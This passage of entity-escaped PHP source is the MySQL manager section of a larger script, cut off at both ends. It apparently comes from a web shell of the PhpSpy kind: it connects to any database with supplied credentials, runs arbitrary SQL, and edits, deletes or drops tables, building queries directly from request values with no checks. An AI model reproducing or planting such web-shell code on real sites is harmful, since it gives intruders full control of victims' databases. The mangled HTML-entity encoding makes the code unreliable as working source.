$dbpass, $dbname, $charset, $dbport); m(q(\u0026#34;UPDATE $tablename SET $valstr WHERE $where LIMIT 1\u0026#34;) ? \u0026#39;Record updating\u0026#39; : mysql_error()); } } if ($doing == \u0026#39;del\u0026#39; \u0026amp;\u0026amp; $base64) { $where = base64_decode($base64); $delete_sql = \u0026#34;DELETE FROM $tablename WHERE $where\u0026#34;; $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); m(q(\u0026#34;DELETE FROM $tablename WHERE $where\u0026#34;) ? \u0026#39;Deletion record of success\u0026#39; : mysql_error()); } if ($tablename \u0026amp;\u0026amp; $doing == \u0026#39;drop\u0026#39;) { $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); if (q(\u0026#34;DROP TABLE $tablename\u0026#34;)) { m(\u0026#39;Drop table of success\u0026#39;); $tablename = \u0026#39;\u0026#39;; } else { m(mysql_error()); } } formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;MYSQL Manager\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;mysqladmin\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); p(\u0026#39;DBHost:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbhost\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 20, \u0026#39;value\u0026#39; =\u0026gt; $dbhost)); p(\u0026#39;:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbport\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 4, \u0026#39;value\u0026#39; =\u0026gt; $dbport)); p(\u0026#39;DBUser:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbuser\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 15, \u0026#39;value\u0026#39; =\u0026gt; $dbuser)); p(\u0026#39;DBPass:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbpass\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 15, \u0026#39;value\u0026#39; =\u0026gt; $dbpass)); p(\u0026#39;DBCharset:\u0026#39;); makeselect(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;charset\u0026#39;, \u0026#39;option\u0026#39; =\u0026gt; $charsetdb, \u0026#39;selected\u0026#39; =\u0026gt; $charset, \u0026#39;nokey\u0026#39; =\u0026gt; 1)); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;connect\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; \u0026#39;Connect\u0026#39;, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;submit\u0026#39;, \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;bt\u0026#39;)); p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); formfoot(); //操作记录 formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;recordlist\u0026#39;)); makehide(\u0026#39;doing\u0026#39;); makehide(\u0026#39;action\u0026#39;, \u0026#39;mysqladmin\u0026#39;); makehide(\u0026#39;base64\u0026#39;); makehide(\u0026#39;tablename\u0026#39;); p($dbform); formfoot(); //选定数据库 formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;setdbname\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;mysqladmin\u0026#39;); p($dbform); if (!$dbname) { makehide(\u0026#39;dbname\u0026#39;); } formfoot(); //选定表 formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;settable\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;mysqladmin\u0026#39;); p($dbform); makehide(\u0026#39;tablename\u0026#39;); makehide(\u0026#39;page\u0026#39;, $page); makehide(\u0026#39;doing\u0026#39;); formfoot(); $cachetables = array(); $pagenum = 30; $page = intval($page); if ($page) { $start_limit = ($page - 1) * $pagenum; } else { $start_limit = 0; $page = 1; } if (isset($dbhost) \u0026amp;\u0026amp; isset($dbuser) \u0026amp;\u0026amp; isset($dbpass) \u0026amp;\u0026amp; isset($connect)) { $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); //获取数据库信息 $mysqlver = mysql_get_server_info(); p(\u0026#39;\u0026lt;p\u0026gt;MySQL \u0026#39; . $mysqlver . \u0026#39; running in \u0026#39; . $dbhost . \u0026#39; as \u0026#39; . $dbuser . \u0026#39;@\u0026#39; . $dbhost . \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); $highver = $mysqlver \u0026gt; \u0026#39;4.1\u0026#39; ? 1 : 0; //获取数据库 $query = q(\u0026#34;SHOW DATABASES\u0026#34;); $dbs = array(); $dbs[] = \u0026#39;-- Select a database --\u0026#39;; while ($db = mysql_fetch_array($query)) { $dbs[$db[\u0026#39;Database\u0026#39;]] = $db[\u0026#39;Database\u0026#39;]; } makeselect(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Please select a database:\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;db[]\u0026#39;, \u0026#39;option\u0026#39; =\u0026gt; $dbs, \u0026#39;selected\u0026#39; =\u0026gt; $dbname, \u0026#39;onchange\u0026#39; =\u0026gt; \u0026#39;moddbname(this.options[this.selectedIndex].value)\u0026#39;, \u0026#39;newline\u0026#39; =\u0026gt; 1)); $tabledb = array(); if ($dbname) { p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); p(\u0026#39;Current dababase: \u0026lt;a href=\u0026#34;javascript:moddbname(\\\u0026#39;\u0026#39; . $dbname . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $dbname . \u0026#39;\u0026lt;/a\u0026gt;\u0026#39;); if ($tablename) { p(\u0026#39; | Current Table: \u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $tablename . \u0026#39;\u0026lt;/a\u0026gt; [ \u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;insert\\\u0026#39;);\u0026#34;\u0026gt;Insert\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;structure\\\u0026#39;);\u0026#34;\u0026gt;Structure\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;drop\\\u0026#39;);\u0026#34;\u0026gt;Drop\u0026lt;/a\u0026gt; ]\u0026#39;); } p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); mysql_select_db($dbname); $getnumsql = \u0026#39;\u0026#39;; $runquery = 0; if ($sql_query) { $runquery = 1; } $allowedit = 0; if ($tablename \u0026amp;\u0026amp; !$sql_query) { $sql_query = \u0026#34;SELECT * FROM $tablename\u0026#34;; $getnumsql = $sql_query; $sql_query = $sql_query . \u0026#34; LIMIT $start_limit, $pagenum\u0026#34;; $allowedit = 1; } p(\u0026#39;\u0026lt;form action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;\u0026lt;table width=\u0026#34;200\u0026#34; border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;0\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;Run SQL query/queries on database \u0026#39; . $dbname . \u0026#39;:\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;textarea name=\u0026#34;sql_query\u0026#34; class=\u0026#34;area\u0026#34; style=\u0026#34;width:600px;height:50px;overflow:auto;\u0026#34;\u0026gt;\u0026#39; . htmlspecialchars($sql_query, ENT_QUOTES) . \u0026#39;\u0026lt;/textarea\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\u0026#34;padding:0 5px;\u0026#34;\u0026gt;\u0026lt;input class=\u0026#34;bt\u0026#34; style=\u0026#34;height:50px;\u0026#34; name=\u0026#34;submit\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Query\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026lt;/table\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;); makehide(\u0026#39;tablename\u0026#39;, $tablename); makehide(\u0026#39;action\u0026#39;, \u0026#39;mysqladmin\u0026#39;); p($dbform); p(\u0026#39;\u0026lt;/form\u0026gt;\u0026#39;); if ($tablename || ($runquery \u0026amp;\u0026amp; $sql_query)) { if ($doing == \u0026#39;structure\u0026#39;) { $result = q(\u0026#34;SHOW FULL COLUMNS FROM $tablename\u0026#34;); $rowdb = array(); while ($row = mysql_fetch_array($result)) { $rowdb[] = $row; } p(\u0026#39;\u0026lt;h3\u0026gt;Structure\u0026lt;/h3\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;table border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;3\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Field\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Type\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Collation\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Null\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Key\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Default\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Extra\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Privileges\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Comment\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); foreach ($rowdb as $row) { $thisbg = bg(); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . $thisbg . \u0026#39;\u0026#34; onmouseover=\u0026#34;this.className=\\\u0026#39;focus\\\u0026#39;;\u0026#34; onmouseout=\u0026#34;this.className=\\\u0026#39;\u0026#39; . $thisbg . \u0026#39;\\\u0026#39;;\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Field\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Type\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Collation\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Null\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Key\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Default\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Extra\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Privileges\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Comment\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); } tbfoot(); $result = q(\u0026#34;SHOW INDEX FROM $tablename\u0026#34;); $rowdb = array(); while ($row = mysql_fetch_array($result)) { $rowdb[] = $row; } p(\u0026#39;\u0026lt;h3\u0026gt;Indexes\u0026lt;/h3\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;table border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;3\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Keyname\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Type\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Unique\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Packed\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Seq_in_index\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Field\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Cardinality\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Collation\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Null\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Comment\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); foreach ($rowdb as $row) { $thisbg = bg(); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . $thisbg . \u0026#39;\u0026#34; onmouseover=\u0026#34;this.className=\\\u0026#39;focus\\\u0026#39;;\u0026#34; onmouseout=\u0026#34;this.className=\\\u0026#39;\u0026#39; . $thisbg . \u0026#39;\\\u0026#39;;\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Key_name\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Index_type\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . ($row[\u0026#39;Non_unique\u0026#39;] ? \u0026#39;No\u0026#39; : \u0026#39;Yes\u0026#39;) . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . ($row[\u0026#39;Packed\u0026#39;] === null ? \u0026#39;No\u0026#39; : $row[\u0026#39;Packed\u0026#39;]) . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Seq_in_index\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Column_name\u0026#39;] . ($row[\u0026#39;Sub_part\u0026#39;] ? \u0026#39;(\u0026#39; . $row[\u0026#39;Sub_part\u0026#39;] . \u0026#39;)\u0026#39; : \u0026#39;\u0026#39;) . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . ($row[\u0026#39;Cardinality\u0026#39;] ? $row[\u0026#39;Cardinality\u0026#39;] : 0) . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Collation\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Null\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $row[\u0026#39;Comment\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); } tbfoot(); } elseif ($doing == \u0026#39;insert\u0026#39; || $doing == \u0026#39;edit\u0026#39;) { $result = q(\u0026#39;SHOW COLUMNS FROM \u0026#39; . $tablename); while ($row = mysql_fetch_array($result)) { $rowdb[] = $row; } $rs = array(); if ($doing == \u0026#39;insert\u0026#39;) { p(\u0026#39;\u0026lt;h2\u0026gt;Insert new line in \u0026#39; . $tablename . \u0026#39; table »\u0026lt;/h2\u0026gt;\u0026#39;); } else { p(\u0026#39;\u0026lt;h2\u0026gt;Update record in \u0026#39; . $tablename . \u0026#39; table »\u0026lt;/h2\u0026gt;\u0026#39;); $where = base64_decode($base64); $result = q(\u0026#34;SELECT * FROM $tablename WHERE $where LIMIT 1\u0026#34;); $rs = mysql_fetch_array($result); } p(\u0026#39;\u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34;\u0026gt;\u0026#39;); p($dbform); makehide(\u0026#39;action\u0026#39;, \u0026#39;mysqladmin\u0026#39;); makehide(\u0026#39;tablename\u0026#39;, $tablename); p(\u0026#39;\u0026lt;table border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;3\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026#39;); foreach ($rowdb as $row) { if ($rs[$row[\u0026#39;Field\u0026#39;]]) { $value = htmlspecialchars($rs[$row[\u0026#39;Field\u0026#39;]]); } else { $value = \u0026#39;\u0026#39;; } $thisbg = bg(); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . $thisbg . \u0026#39;\u0026#34; onmouseover=\u0026#34;this.className=\\\u0026#39;focus\\\u0026#39;;\u0026#34; onmouseout=\u0026#34;this.className=\\\u0026#39;\u0026#39; . $thisbg . \u0026#39;\\\u0026#39;;\u0026#34;\u0026gt;\u0026#39;); if ($row[\u0026#39;Key\u0026#39;] == \u0026#39;UNI\u0026#39; || $row[\u0026#39;Extra\u0026#39;] == \u0026#39;auto_increment\u0026#39; || $row[\u0026#39;Key\u0026#39;] == \u0026#39;PRI\u0026#39;) { p(\u0026#39;\u0026lt;td\u0026gt;\u0026lt;b\u0026gt;\u0026#39; . $row[\u0026#39;Field\u0026#39;] . \u0026#39;\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; . $row[\u0026#39;Type\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39; . $value . \u0026#39; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); } else { p(\u0026#39;\u0026lt;td\u0026gt;\u0026lt;b\u0026gt;\u0026#39; . $row[\u0026#39;Field\u0026#39;] . \u0026#39;\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; . $row[\u0026#39;Type\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;textarea class=\u0026#34;area\u0026#34; name=\u0026#34;insertsql[\u0026#39; . $row[\u0026#39;Field\u0026#39;] . \u0026#39;]\u0026#34; style=\u0026#34;width:500px;height:60px;overflow:auto;\u0026#34;\u0026gt;\u0026#39; . $value . \u0026#39;\u0026lt;/textarea\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); } } if ($doing == \u0026#39;insert\u0026#39;) { p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . bg() . \u0026#39;\u0026#34;\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;input class=\u0026#34;bt\u0026#34; type=\u0026#34;submit\u0026#34; name=\u0026#34;insert\u0026#34; value=\u0026#34;Insert\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); } else { p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . bg() . \u0026#39;\u0026#34;\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;input class=\u0026#34;bt\u0026#34; type=\u0026#34;submit\u0026#34; name=\u0026#34;update\u0026#34; value=\u0026#34;Update\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); makehide(\u0026#39;base64\u0026#39;, $base64); } p(\u0026#39;\u0026lt;/table\u0026gt;\u0026lt;/form\u0026gt;\u0026#39;); } else { $querys = @explode(\u0026#39;;\u0026#39;, $sql_query); foreach ($querys as $num =\u0026gt; $query) { if ($query) { p(\u0026#34;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Query#{$num} : \u0026#34; . htmlspecialchars($query, ENT_QUOTES) . \u0026#34;\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;\u0026#34;); switch (qy($query)) { case 0: p(\u0026#39;\u0026lt;h2\u0026gt;Error : \u0026#39; . mysql_error() . \u0026#39;\u0026lt;/h2\u0026gt;\u0026#39;); break; case 1: if (strtolower(substr($query, 0, 13)) == \u0026#39;select * from\u0026#39;) { $allowedit = 1; } if ($getnumsql) { $tatol = mysql_num_rows(q($getnumsql)); $multipage = multi($tatol, $pagenum, $page, $tablename); } if (!$tablename) { $sql_line = str_replace(array(\u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;, \u0026#34;\\t\u0026#34;), array(\u0026#39; \u0026#39;, \u0026#39; \u0026#39;, \u0026#39; \u0026#39;), trim(htmlspecialchars($query))); $sql_line = preg_replace(\u0026#34;/\\/\\*[^(\\*\\/)]*\\*\\//i\u0026#34;, \u0026#34; \u0026#34;, $sql_line); preg_match_all(\u0026#34;/from\\s+`{0,1}([\\w]+)`{0,1}\\s+/i\u0026#34;, $sql_line, $matches); $tablename = $matches[1][0]; } /*********************/ $getfield = q(\u0026#34;SHOW COLUMNS FROM $tablename\u0026#34;); $rowdb = array(); $keyfied = \u0026#39;\u0026#39;; //主键字段 while ($row = @mysql_fetch_assoc($getfield)) { $rowdb[$row[\u0026#39;Field\u0026#39;]][\u0026#39;Key\u0026#39;] = $row[\u0026#39;Key\u0026#39;]; $rowdb[$row[\u0026#39;Field\u0026#39;]][\u0026#39;Extra\u0026#39;] = $row[\u0026#39;Extra\u0026#39;]; if ($row[\u0026#39;Key\u0026#39;] == \u0026#39;UNI\u0026#39; || $row[\u0026#39;Key\u0026#39;] == \u0026#39;PRI\u0026#39;) { $keyfied = $row[\u0026#39;Field\u0026#39;]; } } /*********************/ //直接浏览表按照主键降序排列 if ($keyfied \u0026amp;\u0026amp; strtolower(substr($query, 0, 13)) == \u0026#39;select * from\u0026#39;) { $query = str_replace(\u0026#34; LIMIT \u0026#34;, \u0026#34; order by $keyfied DESC LIMIT \u0026#34;, $query); } $result = q($query); p($multipage); p(\u0026#39;\u0026lt;table border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;3\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt;\u0026#39;); if ($allowedit) p(\u0026#39;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026#39;); $fieldnum = @mysql_num_fields($result); for ($i = 0; $i \u0026lt; $fieldnum; $i++) { $name = @mysql_field_name($result, $i); $type = @mysql_field_type($result, $i); $len = @mysql_field_len($result, $i); p(\u0026#34;\u0026lt;td nowrap\u0026gt;$name\u0026lt;br\u0026gt;\u0026lt;span\u0026gt;$type($len)\u0026#34; . (($rowdb[$name][\u0026#39;Key\u0026#39;] == \u0026#39;UNI\u0026#39; || $rowdb[$name][\u0026#39;Key\u0026#39;] == \u0026#39;PRI\u0026#39;) ? \u0026#39;\u0026lt;b\u0026gt; - PRIMARY\u0026lt;/b\u0026gt;\u0026#39; : \u0026#39;\u0026#39;) . ($rowdb[$name][\u0026#39;Extra\u0026#39;] == \u0026#39;auto_increment\u0026#39; ? \u0026#39;\u0026lt;b\u0026gt; - Auto\u0026lt;/b\u0026gt;\u0026#39; : \u0026#39;\u0026#39;) . \u0026#34;\u0026lt;/span\u0026gt;\u0026lt;/td\u0026gt;\u0026#34;); } p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); while ($mn = @mysql_fetch_assoc($result)) { $thisbg = bg(); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . $thisbg . \u0026#39;\u0026#34; onmouseover=\u0026#34;this.className=\\\u0026#39;focus\\\u0026#39;;\u0026#34; onmouseout=\u0026#34;this.className=\\\u0026#39;\u0026#39; . $thisbg . \u0026#39;\\\u0026#39;;\u0026#34;\u0026gt;\u0026#39;); $where = $tmp = $b1 = \u0026#39;\u0026#39;; //选取条件字段用 foreach ($mn as $key =\u0026gt; $inside) { if ($inside) { //查找主键、唯一属性、自动增加的字段，找到就停止，否则组合所有字段作为条件。 if ($rowdb[$key][\u0026#39;Key\u0026#39;] == \u0026#39;UNI\u0026#39; || $rowdb[$key][\u0026#39;Extra\u0026#39;] == \u0026#39;auto_increment\u0026#39; || $rowdb[$key][\u0026#39;Key\u0026#39;] == \u0026#39;PRI\u0026#39;) { $where = $key . \u0026#34;=\u0026#39;\u0026#34; . addslashes($inside) . \u0026#34;\u0026#39;\u0026#34;; break; } $where .= $tmp . $key . \u0026#34;=\u0026#39;\u0026#34; . addslashes($inside) . \u0026#34;\u0026#39;\u0026#34;; $tmp = \u0026#39; AND \u0026#39;; } } //读取记录用 foreach ($mn as $key =\u0026gt; $inside) { $b1 .= \u0026#39;\u0026lt;td nowrap\u0026gt;\u0026#39; . html_clean($inside) . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;; } $where = base64_encode($where); if ($allowedit) p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026lt;a href=\u0026#34;javascript:editrecord(\\\u0026#39;edit\\\u0026#39;, \\\u0026#39;\u0026#39; . $where . \u0026#39;\\\u0026#39;, \\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Edit\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:editrecord(\\\u0026#39;del\\\u0026#39;, \\\u0026#39;\u0026#39; . $where . \u0026#39;\\\u0026#39;, \\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Del\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p($b1); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); unset($b1); } p(\u0026#39;\u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt;\u0026#39;); if ($allowedit) p(\u0026#39;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026#39;); $fieldnum = @mysql_num_fields($result); for ($i = 0; $i \u0026lt; $fieldnum; $i++) { $name = @mysql_field_name($result, $i); $type = @mysql_field_type($result, $i); $len = @mysql_field_len($result, $i); p(\u0026#34;\u0026lt;td nowrap\u0026gt;$name\u0026lt;br\u0026gt;\u0026lt;span\u0026gt;$type($len)\u0026#34; . (($rowdb[$name][\u0026#39;Key\u0026#39;] == \u0026#39;UNI\u0026#39; || $rowdb[$name][\u0026#39;Key\u0026#39;] == \u0026#39;PRI\u0026#39;) ? \u0026#39;\u0026lt;b\u0026gt; - PRIMARY\u0026lt;/b\u0026gt;\u0026#39; : \u0026#39;\u0026#39;) . ($rowdb[$name][\u0026#39;Extra\u0026#39;] == \u0026#39;auto_increment\u0026#39; ? \u0026#39;\u0026lt;b\u0026gt; - Auto\u0026lt;/b\u0026gt;\u0026#39; : \u0026#39;\u0026#39;) . \u0026#34;\u0026lt;/span\u0026gt;\u0026lt;/td\u0026gt;\u0026#34;); } p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); tbfoot(); p($multipage); break; case 2: $ar = mysql_affected_rows(); p(\u0026#39;\u0026lt;h2\u0026gt;affected rows : \u0026lt;b\u0026gt;\u0026#39; . $ar . \u0026#39;\u0026lt;/b\u0026gt;\u0026lt;/h2\u0026gt;\u0026#39;); break; } } } } } else { $query = q(\u0026#34;SHOW TABLE STATUS\u0026#34;); $table_num = $table_rows = $data_size = 0; $tabledb = array(); while ($table = mysql_fetch_array($query)) { $data_size = $data_size + $table[\u0026#39;Data_length\u0026#39;]; $table_rows = $table_rows + $table[\u0026#39;Rows\u0026#39;]; $table[\u0026#39;Data_length\u0026#39;] = sizecount($table[\u0026#39;Data_length\u0026#39;]); $table_num++; $tabledb[] = $table; } $data_size = sizecount($data_size); unset($table); p(\u0026#39;\u0026lt;table border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;0\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;form action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\u0026#39;); makehide(\u0026#39;action\u0026#39;, \u0026#39;mysqladmin\u0026#39;); p($dbform); p(\u0026#39;\u0026lt;tr 